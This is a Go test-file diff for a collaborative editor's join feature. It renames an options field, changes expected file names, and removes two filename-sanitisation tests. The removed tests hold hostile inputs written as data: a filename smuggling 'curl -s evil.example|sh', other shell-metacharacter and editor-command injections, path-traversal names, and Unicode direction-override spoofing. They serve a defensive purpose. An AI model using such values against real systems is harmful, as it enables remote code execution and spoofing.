@@ -23,7 +23,7 @@ import (
 // a fresh directory.
 type joinCLIOpts struct {
 	JoinOptions
-	// temporary leaves Directory empty, so the copy goes to a temporary directory.
+	// temporary leaves dir empty, so the copy goes to a temporary directory.
 	temporary bool
 	// beforePublishWriter is Session.beforePublishWriter for the joined session.
 	beforePublishWriter func()
@@ -37,8 +37,8 @@ func joinFromCLI(t *testing.T, f *fixture, o joinCLIOpts) (*Session, error) {
 	if o.beforePublishWriter != nil {
 		o.JoinOptions.beforePublishWriter = o.beforePublishWriter
 	}
-	if o.Directory == "" && !o.temporary {
-		o.Directory = t.TempDir()
+	if o.dir == "" && !o.temporary {
+		o.dir = t.TempDir()
 	}
 	if o.WriteDelay == 0 {
 		o.WriteDelay = 20 * time.Millisecond
@@ -57,7 +57,7 @@ func TestJoinWritesACopyNamedAsTheHostsFile(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if filepath.Base(g.File()) != "notes.md" || g.File() == f.file {
+	if filepath.Base(g.File()) != "00-notes.md" || g.File() == f.file {
 		t.Fatalf("copy = %q (host file %q)", g.File(), f.file)
 	}
 	if got := readFile(t, g.File()); got != "# notes\n" {
@@ -90,7 +90,7 @@ func TestJoinedCopiesArePrivateInExistingDirectory(t *testing.T) {
 			if err := os.Chmod(dir, 0o755); err != nil {
 				t.Fatal(err)
 			}
-			g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
+			g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{dir: dir}})
 			if err != nil {
 				t.Fatal(err)
 			}
@@ -139,7 +139,7 @@ func TestJoinTellsWhenItCannotSaveTheCopy(t *testing.T) {
 func TestJoinReturnsItsFirstWriteFailureWithoutTellingIt(t *testing.T) {
 	f := setup(t, "# notes\n", setupOpts{})
 	dir := t.TempDir()
-	file := filepath.Join(dir, "notes.md")
+	file := filepath.Join(dir, "00-notes.md")
 	// Something that is not a file takes the copy's place as it is written.
 	var once sync.Once
 	hook := func(s filewriter.Step) {
@@ -156,7 +156,7 @@ func TestJoinReturnsItsFirstWriteFailureWithoutTellingIt(t *testing.T) {
 	var mu sync.Mutex
 	var debugged []error
 	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{
-		Directory:  dir,
+		dir:        dir,
 		WriteDelay: time.Minute,
 		writeHook:  hook,
 		OnNotice:   n.add,
@@ -291,7 +291,8 @@ func TestJoinWithoutDirectoryUsesATemporaryCopyAndRemovesIt(t *testing.T) {
 		t.Fatal("copy should be temporary")
 	}
 	dir := filepath.Dir(g.File())
-	if filepath.Base(g.File()) != "notes.md" || !strings.HasPrefix(filepath.Base(dir), "pedit-AAAAAAAAAAAAAAAAAAAAAA-") {
+	// Only the start of the room ID: paths stay short on Windows.
+	if filepath.Base(g.File()) != "00-notes.md" || !strings.HasPrefix(filepath.Base(dir), "pedit-AAAAAAAAAAAAAAAA-") {
 		t.Fatalf("copy = %q", g.File())
 	}
 	if rel, err := filepath.Rel(os.TempDir(), dir); err != nil || strings.HasPrefix(rel, "..") {
@@ -359,7 +360,7 @@ func TestJoinRemovesTheTemporaryDirectoryWhenJoiningFails(t *testing.T) {
 // tempDirs lists pedit's temporary copy directories for this test's room.
 func tempDirs(t *testing.T) []string {
 	t.Helper()
-	matches, err := filepath.Glob(filepath.Join(os.TempDir(), "pedit-AAAAAAAAAAAAAAAAAAAAAA-*"))
+	matches, err := filepath.Glob(filepath.Join(os.TempDir(), "pedit-AAAAAAAAAAAAAAAA-*"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -369,15 +370,15 @@ func tempDirs(t *testing.T) []string {
 func TestJoinRefusesToClobberAFile(t *testing.T) {
 	f := setup(t, "x", setupOpts{})
 	dir := t.TempDir()
-	if err := os.WriteFile(filepath.Join(dir, "notes.md"), []byte("mine"), 0o644); err != nil {
+	if err := os.WriteFile(filepath.Join(dir, "00-notes.md"), []byte("mine"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
+	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{dir: dir}})
 	var exists *ErrFileExists
-	if !errors.As(err, &exists) || exists.Path != filepath.Join(dir, "notes.md") {
+	if !errors.As(err, &exists) || exists.Path != filepath.Join(dir, "00-notes.md") {
 		t.Fatalf("err = %v", err)
 	}
-	if got := readFile(t, filepath.Join(dir, "notes.md")); got != "mine" {
+	if got := readFile(t, filepath.Join(dir, "00-notes.md")); got != "mine" {
 		t.Fatalf("file = %q", got)
 	}
 }
@@ -385,7 +386,7 @@ func TestJoinRefusesToClobberAFile(t *testing.T) {
 func TestJoinRefusesACanvasRoom(t *testing.T) {
 	f := setup(t, `{"nodes":[],"edges":[]}`, setupOpts{name: "board.canvas"})
 	dir := t.TempDir()
-	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
+	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{dir: dir}})
 	if err == nil || !strings.Contains(err.Error(), "canvas") {
 		t.Fatalf("err = %v", err)
 	}
@@ -397,9 +398,9 @@ func TestJoinRefusesACanvasRoom(t *testing.T) {
 func TestJoinFailsWhenNobodyHosts(t *testing.T) {
 	relay := prototest.NewRelay(true)
 	_, err := Join(context.Background(), JoinOptions{
-		URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
-		Directory: t.TempDir(),
-		Dial:      relay.Dial,
+		URL:  "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
+		dir:  t.TempDir(),
+		Dial: relay.Dial,
 	})
 	if !errors.Is(err, ErrRoomClosed) {
 		t.Fatalf("err = %v", err)
@@ -420,7 +421,7 @@ func TestJoinFailsWhenTheRoomIsFull(t *testing.T) {
 		t.Fatal(err)
 	}
 	defer guest.Close()
-	_, err = Join(context.Background(), JoinOptions{URL: url, Directory: t.TempDir(), Dial: relay.Dial})
+	_, err = Join(context.Background(), JoinOptions{URL: url, dir: t.TempDir(), Dial: relay.Dial})
 	if !errors.Is(err, ErrRoomFull) {
 		t.Fatalf("err = %v", err)
 	}
@@ -438,9 +439,9 @@ func TestJoinSaysWhyTheServerTurnedItAway(t *testing.T) {
 		relay.Refuse = code
 		dir := t.TempDir()
 		_, err := Join(context.Background(), JoinOptions{
-			URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
-			Directory: dir,
-			Dial:      relay.Dial,
+			URL:  "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
+			dir:  dir,
+			Dial: relay.Dial,
 		})
 		if !errors.Is(err, want) {
 			t.Fatalf("err = %v, want %v", err, want)
@@ -459,9 +460,9 @@ func TestJoinReportsWhyEvenWhenOnStatusCancels(t *testing.T) {
 		relay.Refuse = protocol.ClientOutdated
 		ctx, cancel := context.WithCancel(context.Background())
 		_, err := Join(ctx, JoinOptions{
-			URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
-			Directory: t.TempDir(),
-			Dial:      relay.Dial,
+			URL:  "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
+			dir:  t.TempDir(),
+			Dial: relay.Dial,
 			OnStatus: func(st protocol.Status) {
 				if st.Final() {
 					cancel()
@@ -479,10 +480,10 @@ func TestJoinGivesUpWhenTheHostStaysSilent(t *testing.T) {
 	// An unhosted relay lets a guest in, but nobody answers.
 	relay := prototest.NewRelay(false)
 	_, err := Join(context.Background(), JoinOptions{
-		URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
-		Directory: t.TempDir(),
-		Dial:      relay.Dial,
-		Timeout:   200 * time.Millisecond,
+		URL:     "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
+		dir:     t.TempDir(),
+		Dial:    relay.Dial,
+		Timeout: 200 * time.Millisecond,
 	})
 	if err == nil || !strings.Contains(err.Error(), "no host answered") {
 		t.Fatalf("err = %v", err)
@@ -512,39 +513,6 @@ func TestParseShareURL(t *testing.T) {
 			t.Errorf("%s: accepted", link)
 		} else if strings.Contains(err.Error(), key) {
 			t.Errorf("%s: key leaked in %q", link, err)
-		}
-	}
-}
-
-func TestSharedFileName(t *testing.T) {
-	for name, ok := range map[string]bool{
-		"notes.md": true, "議事録.md": true, "": false, ".": false, "..": false,
-		"../x.md": false, `..\x.md`: false, "a/b.md": false, "a\x00.md": false, "a\n.md": false,
-		"invoice\u202ecod.md": false, "a\u2066b.md": false, "a\u200fb.md": false, "👨\u200d👩\u200d👧.md": true,
-	} {
-		if _, got := sharedFileName(map[string]any{"file": name}); got != ok {
-			t.Errorf("%q: ok = %v", name, got)
-		}
-	}
-}
-
-func TestSharedFileNameDefusesShellCharacters(t *testing.T) {
-	for name, want := range map[string]string{
-		"notes$(curl -s evil.example|sh).md":              "notes__curl_-s_evil.example_sh_.md",
-		"a`id`;b&c>d<e.md":                                "a_id__b_c_d_e.md",
-		"notes -c '!printf PEDIT_EDITOR_EXECUTED' -c qa!": "notes_-c___printf_PEDIT_EDITOR_EXECUTED__-c_qa_",
-		"!!.md":                          "__.md",
-		`a"b%PATH%^c~d*e?f[g]h{i}j#k.md`: "a_b_PATH__c_d_e_f_g_h_i_j_k.md",
-		"notes (1).md":                   "notes__1_.md",
-		"v1.2_final-draft+x,y@z=w.md":    "v1.2_final-draft+x,y@z=w.md",
-		"議事録（第1回）.md":                    "議事録（第1回）.md",
-		"👨\u200d👩\u200d👧.md":             "👨\u200d👩\u200d👧.md",
-		"a\u00a0b\u3000c.md":             "a_b_c.md",
-		"a\u2014b\u201cc\u2019d.md":      "a_b_c_d.md",
-		"a\u2016b.md":                    "a\u2016b.md",
-	} {
-		if got, ok := sharedFileName(map[string]any{"file": name}); !ok || got != want {
-			t.Errorf("%q = %q, %v; want %q", name, got, ok, want)
 		}
 	}
 }
